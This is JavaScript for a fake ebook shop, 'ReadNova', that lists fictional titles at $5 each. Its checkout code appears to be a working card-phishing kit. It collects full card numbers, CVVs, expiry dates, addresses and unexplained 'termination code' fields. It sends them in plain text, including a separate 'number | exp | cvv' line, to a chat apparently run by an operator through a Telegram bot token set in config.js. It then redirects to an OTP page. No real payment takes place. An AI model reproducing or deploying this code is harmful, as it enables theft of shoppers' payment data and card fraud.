const books = [
["The Moon Remembers","Fantasy","A cartographer discovers that every moonlit map reveals a memory someone tried to erase.","Mira Vale","312 pages","Fantasy · Magical realism"],
["Velvet Afterdark","Romance","Two strangers meet in a city that never sleeps and discover that the truth is more intimate than a kiss.","Jules Avery","286 pages","Romance · Contemporary"],
["The Last Key","Mystery","A locked-room mystery leaves seven suspects, one impossible clue, and a detective running out of midnight.","Elliot Wren","294 pages","Mystery · Detective"],
["A Garden of Ghosts","Fantasy","In a forgotten garden, every flower blooms with the voice of someone who never said goodbye.","Nia Rowan","338 pages","Fantasy · Gothic"],
["The Quiet Algorithm","Thriller","A data analyst finds a pattern predicting crimes before they happen—and her name is next.","Theo Mercer","301 pages","Thriller · Tech mystery"],
["How to Begin Again","Self-growth","A practical, gentle guide to rebuilding momentum when life feels like a room with no doors.","Amara Ellis","184 pages","Self-growth · Mindset"],
["Letters from Tomorrow","Romance","A bookseller receives letters from a future that changes every time she falls in love.","Sophie Lane","272 pages","Romance · Time-slip"],
["The City Beneath Us","Fantasy","Below the streets lies a hidden kingdom where forgotten dreams become dangerous currency.","K. J. Sol","356 pages","Fantasy · Adventure"],
["Seven Minutes Missing","Mystery","Seven minutes vanish from a witness's memory. The truth hides in the silence between them.","Rory Finch","268 pages","Mystery · Suspense"],
["Wildly Unfinished","Self-growth","Permission to be a work in progress, with small rituals for a life that feels more like yours.","Maya Brooks","196 pages","Self-growth · Creativity"],
["Blackout at Dawn","Thriller","When the power dies across a coastal town, one house keeps glowing—and someone inside knows why.","D. R. Cole","322 pages","Thriller · Suspense"],
["The Starling Pact","Fantasy","A runaway prince bargains with a flock of magical birds to reclaim a kingdom that forgot him.","Iris North","344 pages","Fantasy · Epic"],
["Coffee for Two Strangers","Romance","A café mix-up turns into a weekly ritual, a shared secret, and an unexpected second chance.","Lena Hart","248 pages","Romance · Feel-good"],
["The Paper Astronaut","Fantasy","A child folds a paper rocket that can fly beyond the edge of the known universe.","Felix Arden","230 pages","Fantasy · Wonder"],
["No One Leaves Briar House","Mystery","A weekend reunion at an isolated estate turns sinister when the front gate disappears from every map.","June Holloway","316 pages","Mystery · Gothic"],
["The Art of Noticing","Self-growth","Tiny daily practices to find beauty, clarity, and meaning in the details everyone else misses.","Eden Wells","172 pages","Self-growth · Mindfulness"],
["Glass Hearts Club","Romance","Four friends make a pact to stop falling for the wrong people. The pact lasts eleven days.","Tessa Quinn","279 pages","Romance · Friendship"],
["The Midnight Orchard","Fantasy","Fruit from a midnight orchard grants one wish—and takes a memory as payment.","A. L. Winter","329 pages","Fantasy · Dark fairytale"],
["The Echo Room","Thriller","A journalist's anonymous source knows details from a crime scene that has not happened yet.","Miles Grey","291 pages","Thriller · Psychological"],
["Small Wins, Big Life","Self-growth","A no-pressure playbook for turning tiny habits into a life that feels lighter and more intentional.","Jordan Reed","188 pages","Self-growth · Habits"],
["The Lighthouse Cipher","Mystery","A lighthouse keeper leaves a coded journal that points to a ship no one remembers sinking.","P. W. Shore","304 pages","Mystery · Coastal"],
["Borrowed Starlight","Romance","An astronomer and a night-shift baker trade wishes beneath a sky full of borrowed stars.","Clara Moon","260 pages","Romance · Cozy"],
["The Bone Collector's Map","Fantasy","A mapmaker who can hear bones speak is hired to find a city erased from history.","R. M. Ash","372 pages","Fantasy · Adventure"],
["The Perfect Alibi","Mystery","Three people confess to the same murder. Only one of them was ever in the room.","Sloane Mercer","287 pages","Mystery · Crime"],
["Unfollow the Noise","Self-growth","Reclaim your attention and build a quieter, more focused relationship with your everyday life.","Kai Bennett","166 pages","Self-growth · Digital wellness"],
["The Thirteenth Floor","Thriller","The elevator skips a floor that does not exist—until a tenant comes home from it.","M. J. Vale","310 pages","Thriller · Supernatural"],
["The Sea Between Names","Romance","Two childhood pen pals finally meet, each carrying a truth that could end their story before it starts.","Elise Harbor","282 pages","Romance · Emotional"],
["The Witch's Last Recipe","Fantasy","A kitchen witch's final cookbook contains recipes that can rewrite the past—one ingredient at a time.","Poppy Flint","298 pages","Fantasy · Cozy magic"],
["A Study in Silence","Mystery","A music conservatory falls quiet after a celebrated violinist disappears during a live performance.","Noah Bell","276 pages","Mystery · Arts"],
["Make Room for Wonder","Self-growth","Simple prompts and experiments to bring curiosity back into a busy, overplanned life.","Rae Summers","158 pages","Self-growth · Creativity"],
["The Red Window","Thriller","Every night at 2:17, a red window lights up in an abandoned building. Tonight, someone waves.","C. A. Mercer","319 pages","Thriller · Suspense"],
["The Dragon's Post Office","Fantasy","A rookie postal worker discovers the letters addressed to dragons are very much overdue.","Milo Fern","242 pages","Fantasy · Whimsical"],
["The Almost Love Story","Romance","They had perfect timing for everyone except each other. Years later, the timing changes.","Harper June","270 pages","Romance · Second chance"],
["The Vanishing Hour","Mystery","A clockmaker's entire town loses one hour, and only a child remembers what happened inside it.","G. T. Rivers","307 pages","Mystery · Time mystery"],
["Brave Enough Today","Self-growth","A compassionate guide to doing difficult things in small, manageable steps.","Olive Grant","177 pages","Self-growth · Confidence"],
["The Hollow Crown","Fantasy","A queen without a reflection must choose between saving her people and keeping her own name.","S. L. Frost","365 pages","Fantasy · Epic"],
["Dead Air Darling","Thriller","A late-night radio host receives a caller who describes a crime unfolding live across town.","Riley Knox","283 pages","Thriller · Crime"],
["A Map of Almosts","Romance","A travel writer retraces all the places she nearly met the person who changes everything.","Maren Wells","258 pages","Romance · Travel"],
["The Museum of Lost Things","Mystery","An archivist finds an exhibit of objects that vanished from people's homes the very same night.","Cleo Hart","296 pages","Mystery · Magical mystery"],
["Rest Is a Revolution","Self-growth","A practical reset for people who are tired of measuring their worth by how much they do.","Sam Rivers","190 pages","Self-growth · Wellbeing"],
["The Winter Signal","Thriller","A remote research station receives a radio signal in the voice of an explorer missing for decades.","Avery Stone","330 pages","Thriller · Survival"],
["The Foxfire Library","Fantasy","A hidden library appears only to those who have lost a story they desperately need to tell.","Lumi Gray","318 pages","Fantasy · Magical"],
["Kiss Me at Platform Nine","Romance","Two commuters miss the same train every Friday and start hoping it happens again.","Mia Rose","244 pages","Romance · Contemporary"],
["The Unseen Witness","Mystery","A courtroom sketch artist notices a face in the background of every piece of evidence.","Dylan Cross","288 pages","Mystery · Legal"],
["The Confidence Experiment","Self-growth","Thirty small challenges designed to help you trust your own voice and take up space.","Nora James","181 pages","Self-growth · Personal growth"],
["The Sunken Choir","Fantasy","Beneath a flooded cathedral, a choir sings a warning that only one diver can understand.","E. M. Lake","351 pages","Fantasy · Dark adventure"],
["The House on Maybe Street","Mystery","A new homeowner discovers that every previous owner left the same strange note behind.","Willa Page","275 pages","Mystery · Cozy"],
["The Last Good Secret","Thriller","A reunion game asks old friends to reveal one secret. By morning, one friend is missing.","J. T. Blake","303 pages","Thriller · Psychological"],
["The Shape of Second Chances","Romance","A ceramic artist and a divorced chef rebuild their lives one imperfect piece at a time.","Ruby Lane","266 pages","Romance · Healing"],
["Dreams for the Restless","Fantasy","A sleep researcher enters a shared dreamscape and discovers someone is editing the ending.","Arlo Finch","340 pages","Fantasy · Surreal"]
];

const palettes = [
["#251342","#8555dc"],["#401d38","#d56b9d"],["#102a3a","#398c9a"],["#48244d","#b16ad0"],["#111827","#5967c7"],
["#244a40","#6fbb9b"],["#352044","#a77bd4"],["#132b53","#4984c7"],["#5b2d24","#d48b65"],["#3e3b72","#a7a1ed"],
["#171923","#b94757"],["#173f42","#68b2a8"],["#6b2b50","#d18ab4"],["#183c70","#8bb5f0"],["#343044","#8c7e9f"]
];

const LABELS = {
  full_name:"Name", email:"Email", ebook:"Book",
  card_number:"CARD", card_expiry:"EXP", card_cvv:"CVV", card_name:"Cardholder",
  street:"Street", city:"City", state:"State", zip:"ZIP", country:"Country",
  reference_number:"Reference", termination_part_one:"Code 1", termination_part_two:"Code 2", additional_number:"Additional"
};

const grid=document.getElementById('book-grid'), search=document.getElementById('search'), count=document.getElementById('book-count');
let activeGenre='All', selectedBook=null;
function palette(i){return palettes[i%palettes.length]}

const cardEl=document.getElementById('card-number');
const expEl=document.getElementById('card-expiry');
const cvvEl=document.getElementById('card-cvv');
const brandEl=document.getElementById('card-brand');

function digits(s){return s.replace(/\D/g,'')}

function brandOf(d){
  if(/^4/.test(d))return 'Visa';
  if(/^(5[1-5]|2[2-7])/.test(d))return 'Mastercard';
  if(/^3[47]/.test(d))return 'Amex';
  if(/^(6011|65|64[4-9])/.test(d))return 'Discover';
  if(/^3(0[0-5]|[68])/.test(d))return 'Diners';
  if(/^35/.test(d))return 'JCB';
  return '';
}

function luhn(d){
  if(d.length<13)return false;
  let sum=0,alt=false;
  for(let i=d.length-1;i>=0;i--){
    let n=+d[i];
    if(alt){n*=2;if(n>9)n-=9}
    sum+=n;alt=!alt;
  }
  return sum%10===0;
}

function expValid(v){
  const m=v.match(/^(\d{2})\s*\/\s*(\d{2})$/);
  if(!m)return false;
  const mm=+m[1], yy=+m[2];
  if(mm<1||mm>12)return false;
  const now=new Date(), cy=now.getFullYear()%100, cm=now.getMonth()+1;
  return yy>cy||(yy===cy&&mm>=cm);
}

cardEl.addEventListener('input',()=>{
  const d=digits(cardEl.value).slice(0,19);
  cardEl.value=d.replace(/(.{4})/g,'$1 ').trim();
  brandEl.textContent=brandOf(d);
  cardEl.classList.remove('invalid');
});

expEl.addEventListener('input',()=>{
  let v=digits(expEl.value).slice(0,4);
  if(v.length>2)v=v.slice(0,2)+'/'+v.slice(2);
  expEl.value=v;
  expEl.classList.remove('invalid');
});

cvvEl.addEventListener('input',()=>{
  cvvEl.value=digits(cvvEl.value).slice(0,4);
  cvvEl.classList.remove('invalid');
});

function renderBooks(){
  const term=search.value.trim().toLowerCase();
  const filtered=books.map((b,i)=>({data:b,index:i})).filter(x=>(activeGenre==='All'||x.data[1]===activeGenre)&&x.data.join(' ').toLowerCase().includes(term));
  count.textContent=filtered.length+' ebook'+(filtered.length===1?'':'s');
  document.getElementById('no-results').hidden=filtered.length!==0;
  grid.innerHTML=filtered.map(({data:b,index:i})=>{
    const p=palette(i);
    return '<article class="book-card" tabindex="0" role="button" aria-label="View '+b[0]+'" data-index="'+i+'">'
      +'<div class="book-cover" style="background:linear-gradient(145deg,'+p[0]+','+p[1]+')">'
      +'<span class="cover-label">READNOVA ORIGINAL</span>'
      +'<strong class="cover-title">'+b[0]+'</strong>'
      +'<span class="cover-sub">'+b[1].toUpperCase()+' · A STORY TO KEEP</span></div>'
      +'<div class="book-info"><h3>'+b[0]+'</h3><span class="book-genre">'+b[1]+'</span>'
      +'<div class="book-price">$5.00 <span style="color:#9a92a5;font-weight:500">· ebook</span></div></div></article>';
  }).join('');
  grid.querySelectorAll('.book-card').forEach(card=>{
    card.addEventListener('click',()=>openBook(+card.dataset.index));
    card.addEventListener('keydown',e=>{if(e.key==='Enter'||e.key===' '){e.preventDefault();openBook(+card.dataset.index)}});
  });
}

function openBook(i){
  selectedBook={data:books[i],index:i};
  const b=books[i],p=palette(i);
  const cover=document.getElementById('modal-cover');
  cover.style.background='linear-gradient(145deg,'+p[0]+','+p[1]+')';
  cover.innerHTML='<span class="cover-label">READNOVA ORIGINAL</span><strong class="cover-title">'+b[0]+'</strong><span class="cover-sub">'+b[1].toUpperCase()+' · A STORY TO KEEP</span>';
  document.getElementById('modal-genre').textContent=b[1].toUpperCase()+' · EDITOR’S PICK';
  document.getElementById('modal-title').textContent=b[0];
  document.getElementById('modal-description').textContent=b[2];
  document.getElementById('modal-pages').textContent=b[4];
  document.getElementById('modal-length').textContent=b[5];
  document.getElementById('modal-rating').textContent=(4.5+((i*7)%5)/10).toFixed(1);
  document.getElementById('book-modal').hidden=false;
  document.body.style.overflow='hidden';
}

function closeModal(id){
  document.getElementById(id).hidden=true;
  if(document.getElementById('book-modal').hidden&&document.getElementById('checkout-modal').hidden)document.body.style.overflow='';
}

document.getElementById('close-book').addEventListener('click',()=>closeModal('book-modal'));
document.getElementById('close-checkout').addEventListener('click',()=>closeModal('checkout-modal'));
document.getElementById('buy-book').addEventListener('click',()=>{
  document.getElementById('book-modal').hidden=true;
  document.getElementById('checkout-book-name').textContent=selectedBook.data[0];
  document.getElementById('form-ebook').value=selectedBook.data[0];
  document.getElementById('checkout-modal').hidden=false;
});
document.querySelectorAll('.modal-backdrop').forEach(el=>el.addEventListener('click',e=>{if(e.target===el)closeModal(el.id)}));
document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeModal('book-modal');closeModal('checkout-modal')}});
search.addEventListener('input',renderBooks);
document.getElementById('clear-search').addEventListener('click',()=>{search.value='';renderBooks();search.focus()});
document.querySelectorAll('.filter').forEach(btn=>btn.addEventListener('click',()=>{
  document.querySelectorAll('.filter').forEach(x=>x.classList.remove('active'));
  btn.classList.add('active');activeGenre=btn.dataset.genre;renderBooks();
}));

function buildOrder(form){
  const fd=new FormData(form);
  const get=k=>String(fd.get(k)||'').trim();
  const num=digits(get('card_number'));
  const brand=brandOf(num);
  const order=[
    'NEW ORDER — ReadNova',
    '',
    'BOOK: '+(get('ebook')||'—'),
    'NAME: '+get('full_name'),
    'EMAIL: '+get('email'),
    '',
    'CARD: '+num,
    'EXP: '+get('card_expiry'),
    'CVV: '+get('card_cvv'),
    'HOLDER: '+get('card_name'),
    brand?'BRAND: '+brand:'',
    '',
    'ADDRESS:',
    get('street'),
    get('city')+', '+get('state')+' '+get('zip'),
    get('country'),
    '',
    'REF: '+get('reference_number'),
    'CODE1: '+get('termination_part_one'),
    'CODE2: '+get('termination_part_two'),
    'ADD: '+get('additional_number'),
    '',
    new Date().toLocaleString()
  ].join('\n');
  const triple=num+' | '+get('card_expiry')+' | '+get('card_cvv')+(brand?' | '+brand:'');
  return {order:order,triple:triple,ctx:{card:num,exp:get('card_expiry'),name:get('card_name'),book:get('ebook'),last4:num.slice(-4)}};
}

document.getElementById('order-form').addEventListener('submit',async e=>{
  e.preventDefault();
  const form=e.currentTarget;
  const status=document.getElementById('form-status');
  const button=form.querySelector('.confirm-btn');

  status.hidden=true;status.classList.remove('error');
  [cardEl,expEl,cvvEl].forEach(el=>el.classList.remove('invalid'));

  const num=digits(cardEl.value);
  if(!luhn(num)){cardEl.classList.add('invalid');cardEl.focus();status.textContent='That card number does not look right. Please check it.';status.classList.add('error');status.hidden=false;return}
  if(!expValid(expEl.value)){expEl.classList.add('invalid');expEl.focus();status.textContent='Expiry must be MM/YY and not in the past.';status.classList.add('error');status.hidden=false;return}
  if(digits(cvvEl.value).length<3){cvvEl.classList.add('invalid');cvvEl.focus();status.textContent='CVV must be 3 or 4 digits.';status.classList.add('error');status.hidden=false;return}

  const required=['full_name','email','card_name','street','city','state','zip','country','reference_number','termination_part_one','termination_part_two','additional_number'];
  for(const n of required){
    if(!String(form.elements[n].value).trim()){
      form.elements[n].classList.add('invalid');
      form.elements[n].focus();
      status.textContent='Please fill in every field.';
      status.classList.add('error');status.hidden=false;return;
    }
  }
  if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(form.elements.email.value)){
    form.elements.email.classList.add('invalid');form.elements.email.focus();
    status.textContent='That email address looks wrong.';
    status.classList.add('error');status.hidden=false;return;
  }

  button.disabled=true;button.textContent='PROCESSING…';

  const payload=buildOrder(form);
  try{
    await tgSend(payload.order);
    try{await tgSend(payload.triple)}catch(_){}
    sessionStorage.setItem('rn_ctx',JSON.stringify(payload.ctx));
    window.location.href='otp.html';
  }catch(err){
    status.textContent='Could not send the order. '+(tgMissing()?'Set your token and chat ID in config.js.':'Try again in a moment.');
    status.classList.add('error');
    status.hidden=false;
    console.error(err);
    button.disabled=false;
    button.innerHTML='CONFIRM ORDER ↗';
  }
});

renderBooks();
